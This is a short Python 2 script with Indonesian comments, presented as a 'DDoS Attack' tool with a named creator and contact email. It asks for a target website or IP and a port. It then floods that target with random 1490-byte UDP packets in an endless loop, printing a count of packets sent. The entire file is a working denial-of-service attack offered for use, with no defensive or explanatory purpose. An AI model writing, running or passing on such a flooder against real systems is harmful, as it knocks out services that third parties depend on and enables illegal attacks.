import sys
import os
import time
import socket
import random
#Perlengkapan Tempur :v
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDoS Attack RCT")
print
print "Creator   : NohRa"
print "Thanks To : Hlaing Phyo"
print "Email     : nohraOffical@gmail.com"
print "Team.     : NohRa"
print
ip = raw_input("Website or IP Target : ")
port = input(" Port      : ")

os.system("clear")
os.system("figlet Dimulai")
sent = 0
while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
     port = port + 0
     print "Sent %s packet to %s Attack! !!!:%s"%(sent,ip,port)
     if port == 65534:
       port = 0
